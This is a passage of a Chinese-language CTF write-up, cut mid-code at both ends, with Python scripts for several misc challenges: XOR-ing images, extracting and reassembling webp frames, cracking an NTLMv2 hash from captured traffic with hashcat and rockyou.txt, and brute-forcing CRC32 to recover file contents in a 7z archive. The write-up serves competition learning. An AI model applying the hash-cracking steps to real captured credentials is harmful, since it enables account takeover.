class=\"token keyword\">import</span> numpy <span class=\"token keyword\">as</span> np</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>img1 <span class=\"token operator\">=</span> Image<span class=\"token punctuation\">.</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'xqr.png'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>convert<span class=\"token punctuation\">(</span><span class=\"token string\">'RGB'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>img2 <span class=\"token operator\">=</span> Image<span class=\"token punctuation\">.</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'xqr2.png'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>convert<span class=\"token punctuation\">(</span><span class=\"token string\">'RGB'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>img1 <span class=\"token operator\">=</span> img1<span class=\"token punctuation\">.</span>resize<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token number\">75</span><span class=\"token punctuation\">,</span> <span class=\"token number\">75</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>img2 <span class=\"token operator\">=</span> img2<span class=\"token punctuation\">.</span>resize<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token number\">75</span><span class=\"token punctuation\">,</span> <span class=\"token number\">75</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>img1_array <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>array<span class=\"token punctuation\">(</span>img1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>img2_array <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>array<span class=\"token punctuation\">(</span>img2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>result_array <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>bitwise_xor<span class=\"token punctuation\">(</span>img1_array<span class=\"token punctuation\">,</span> img2_array<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>result_image <span class=\"token operator\">=</span> Image<span class=\"token punctuation\">.</span>fromarray<span class=\"token punctuation\">(</span>result_array<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>result_image<span class=\"token punctuation\">.</span>save<span class=\"token punctuation\">(</span><span class=\"token string\">\"22.png\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>last <span class=\"token operator\">=</span> result_image<span class=\"token punctuation\">.</span>resize<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>result_image<span class=\"token punctuation\">.</span>height<span class=\"token operator\">*</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span>result_image<span class=\"token punctuation\">.</span>width<span class=\"token operator\">*</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>last<span class=\"token punctuation\">.</span>save<span class=\"token punctuation\">(</span><span class=\"token string\">\"22.png\"</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"death_n1te\"><a class=\"markdownIt-Anchor\" href=\"#death_n1te\">#</a> DEATH_N1TE</h3>\n<p>给出一个.mp3 文件和一个.webp 文件</p>\n<p><img data-src=\"/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98pic/killer.webp\" alt=\"killer\"></p>\n<p>MP3 文件最好有一点 SSTV 音频，进行识别后</p>\n<p><img data-src=\"/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98pic/15.png\" alt=\"2\"></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> subprocess</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>input_file <span class=\"token operator\">=</span> <span class=\"token string\">\"killer.webp\"</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\"># 获取帧数</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>get_frames_command <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'webpmux'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'-info'</span><span class=\"token punctuation\">,</span> input_file<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>result <span class=\"token operator\">=</span> subprocess<span class=\"token punctuation\">.</span>run<span class=\"token punctuation\">(</span>get_frames_command<span class=\"token punctuation\">,</span> capture_output<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">,</span> text<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>lines <span class=\"token operator\">=</span> result<span class=\"token punctuation\">.</span>stdout<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>frames_line <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>line <span class=\"token keyword\">for</span> line <span class=\"token keyword\">in</span> lines <span class=\"token keyword\">if</span> <span class=\"token string\">'Number of frames:'</span> <span class=\"token keyword\">in</span> line<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>frames <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>frames_line<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">':'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\"># 提取所有帧</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> frames<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    extract_frame_command <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'webpmux'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'-get'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'frame'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> input_file<span class=\"token punctuation\">,</span> <span class=\"token string\">'-o'</span><span class=\"token punctuation\">,</span> <span class=\"token string-interpolation\"><span class=\"token string\">f'frame</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>i<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">.webp'</span></span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    subprocess<span class=\"token punctuation\">.</span>run<span class=\"token punctuation\">(</span>extract_frame_command<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>分解所有帧</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> os</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> PIL <span class=\"token keyword\">import</span> Image</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># 创建新的目录来储存.png 图像</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> os<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">.</span>exists<span class=\"token punctuation\">(</span><span class=\"token string\">'png_images'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    os<span class=\"token punctuation\">.</span>makedirs<span class=\"token punctuation\">(</span><span class=\"token string\">'png_images'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># 循环遍历所有.webp 图像</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">881</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>  <span class=\"token comment\"># 从 frame1.webp 到 frame880.webp</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    img_name <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f'frame</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>i<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">.webp'</span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">if</span> os<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">.</span>isfile<span class=\"token punctuation\">(</span>img_name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        img <span class=\"token operator\">=</span> Image<span class=\"token punctuation\">.</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>img_name<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        img<span class=\"token punctuation\">.</span>save<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'png_images/frame</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>i<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">.png'</span></span><span class=\"token punctuation\">,</span> <span class=\"token string\">'PNG'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>img_name<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> does not exist.'</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Conversion from .webp to .png completed.'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>转 png 图片</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> cv2</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> numpy <span class=\"token keyword\">as</span> np</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> PIL <span class=\"token keyword\">import</span> Image</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\"># 创建一个列表来保存所有的图片</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>images <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># 读取所有的图片</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">881</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    img <span class=\"token operator\">=</span> cv2<span class=\"token punctuation\">.</span>imread<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'frame</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>i<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">.png'</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token comment\"># OpenCV 读取图片默认是 BGR，转换成 RGB</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    img <span class=\"token operator\">=</span> cv2<span class=\"token punctuation\">.</span>cvtColor<span class=\"token punctuation\">(</span>img<span class=\"token punctuation\">,</span> cv2<span class=\"token punctuation\">.</span>COLOR_BGR2RGB<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    images<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>img<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\"># 确定你想要的矩形形状</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>rows <span class=\"token operator\">=</span> <span class=\"token number\">22</span>     <span class=\"token comment\"># 我们这里假设你想要的矩形有 30 行</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>cols <span class=\"token operator\">=</span> <span class=\"token number\">40</span>   <span class=\"token comment\"># 我们这里假设你想要的矩形有 30 列</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\"># 创建一个空的列表来保存最终的矩形图片</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>final_images <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token comment\"># 将图片组织成矩形形状</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> rows<span class=\"token operator\">*</span>cols<span class=\"token punctuation\">,</span> cols<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token comment\"># 使用 hstack 函数将一行的图片组合在一起</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    row <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>hstack<span class=\"token punctuation\">(</span>images<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">:</span>i<span class=\"token operator\">+</span>cols<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    final_images<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>row<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token comment\"># 使用 vstack 函数将所有的行堆叠在一起</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>merged_image <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>vstack<span class=\"token punctuation\">(</span>final_images<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token comment\"># 使用 PIL 将 numpy 数组转换成图片</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>merged_image <span class=\"token operator\">=</span> Image<span class=\"token punctuation\">.</span>fromarray<span class=\"token punctuation\">(</span>merged_image<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token comment\"># 保存合并后的图片</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>merged_image<span class=\"token punctuation\">.</span>save<span class=\"token punctuation\">(</span><span class=\"token string\">'3.png'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>合并，用 gaps 拼图解决</p>\n<pre><code>gaps run puzzle.jpg solution.jpg --generations=20 --population=600\n</code></pre>\n<p><img data-src=\"/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98pic/solution.png\" alt=\"solution\"></p>\n<p>解决 base64 得到 flag</p>\n<h3 id=\"窃听风云\"><a class=\"markdownIt-Anchor\" href=\"#窃听风云\">#</a> 窃听风云</h3>\n<blockquote password=\"\">\n<p>Hacker 捕获到了一段敌对公司的对话信息流量，你能从流量中分析出 Jack 的密码吗，flag 为 SYC</p>\n</blockquote>\n<p>是一个 NTLNMSSP 流量分析</p>\n<p><img data-src=\"/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98pic/image-20231101155722725.png\" alt=\"image-20231101155722725\"></p>\n<p>通过对话，得知密码所用字典为 rockyou.txt</p>\n<p>username::Domian:ntlmssp.ntlmserverchallenge:ntlmssp.ntlmv2_response.ntproofstr:ntlmssp.ntlmv2_response</p>\n<p>得到</p>\n<blockquote>\n<p>jack::WIDGETLLC:2af71b5ca7246268:2d1d24572b15fe544043431c59965d30:0101000000000000040d962b02edd901e6994147d6a34af200000000020012005700490044004700450054004c004c004300010008004400430030003100040024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c0003002e0044004300300031002e005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c00050024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c0007000800040d962b02edd90106000400020000000800300030000000000000000000000000300000078cdc520910762267e40488b60032835c6a37604d1e9be3ecee58802fb5f9150a001000000000000000000000000000000000000900200048005400540050002f003100390032002e003100360038002e0030002e0031000000000000000000</p>\n</blockquote>\n<p>用 hashcat 跑，得到 password</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>hashcat <span class=\"token operator\">-</span>m <span class=\"token number\">5600</span> 保存的字符串<span class=\"token punctuation\">.</span>txt 密码字典<span class=\"token punctuation\">.</span>txt <span class=\"token operator\">-</span>o 结果<span class=\"token punctuation\">.</span>txt <span class=\"token operator\">-</span><span class=\"token operator\">-</span>force</pre></td></tr></table></figure><h3 id=\"extractme\"><a class=\"markdownIt-Anchor\" href=\"#extractme\">#</a> extractMe</h3>\n<p>下载之后，一眼顶针 7z crc4 位爆破</p>\n<p>套脚本</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> zlib</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> py7zr</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> string</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">from</span> itertools <span class=\"token keyword\">import</span> product</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Usage: 7zcrc_cracker.py &lt;7z_file>'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    exit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>file_list <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>crc_list <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>cracked <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    archive <span class=\"token operator\">=</span> py7zr<span class=\"token punctuation\">.</span>SevenZipFile<span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> mode<span class=\"token operator\">=</span><span class=\"token string\">'r'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'[x] Invalid 7z provided!'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    exit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>archive_list <span class=\"token operator\">=</span> archive<span class=\"token punctuation\">.</span><span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">for</span> archive <span class=\"token keyword\">in</span> archive_list<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">if</span> archive<span class=\"token punctuation\">.</span>uncompressed <span class=\"token operator\">==</span> <span class=\"token number\">4</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'\\033[1m\\033[92m[*] Found vulnerable file to CRC32 bruteforcing!\\033[0m'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'\\033[1m\\033[94mFilename:\\033[0m &#123;&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>archive<span class=\"token punctuation\">.</span>filename<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'\\033[1m\\033[94mCRC32:\\033[0m &#123;&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>archive<span class=\"token punctuation\">.</span>crc32<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        file_list<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>archive<span class=\"token punctuation\">.</span>filename<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        crc_list<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>archive<span class=\"token punctuation\">.</span>crc32<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>all_char <span class=\"token operator\">=</span> string<span class=\"token punctuation\">.</span>printable</pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token keyword\">for</span> l <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    generator <span class=\"token operator\">=</span> product<span class=\"token punctuation\">(</span>all_char<span class=\"token punctuation\">,</span> repeat<span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>l<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'\\033[1;33m&lt;=================================================>\\033[0m'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token keyword\">for</span> p <span class=\"token keyword\">in</span> generator<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    pt <span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    crc <span class=\"token operator\">=</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>zlib<span class=\"token punctuation\">.</span>crc32<span class=\"token punctuation\">(</span>pt<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xffffffff</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token keyword\">if</span> crc <span class=\"token keyword\">in</span> crc_list<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'\\033[1m\\033[92m[!] Cracked plaintext for file!\\033[0m'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'\\033[1m\\033[94mFilename: &#123;&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>file_list<span class=\"token punctuation\">[</span>crc_list<span class=\"token punctuation\">.</span>index<span class=\"token punctuation\">(</span>crc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'\\033[1m\\033[94mPlaintext: &#123;&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>pt<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>        cracked <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>        <span class=\"token keyword\">if</span> cracked <span class=\"token operator\">==</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>crc_list<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>            exit<span class=\"token punctuation\">(</span><span class=\"token 